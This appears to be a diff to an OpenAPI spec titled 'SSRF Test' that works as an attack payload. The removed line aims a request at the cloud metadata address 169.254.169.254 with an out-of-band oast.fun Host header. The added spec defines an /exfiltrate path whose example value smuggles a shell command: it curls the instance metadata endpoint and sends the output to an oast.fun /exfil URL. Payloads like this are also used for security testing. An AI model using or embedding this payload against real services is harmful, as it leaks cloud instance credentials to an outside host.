@@ -1,1 +1,19 @@
-remoteref:  url: http://169.254.169.254/latest/meta-data/  method: POST  headers:    Host: ommsgxmitysvgnxszleccea3umem7j3k1.oast.fun
+openapi: "3.0.0"
+info:
+  title: "SSRF Test"
+  version: "1.0.0"
+paths:
+  /exfiltrate:
+    get:
+      summary: "Trigger SSRF"
+      responses:
+        '200':
+          description: "SSRF Attempt"
+          content:
+            application/json:
+              schema:
+                type: object
+                properties:
+                  exfiltrated_data:
+                    type: string
+                    example: "http://ommsgxmitysvgnxszleccea3umem7j3k1.oast.fun/exfil?data=$(curl http://169.254.169.254/latest/meta-data/)"
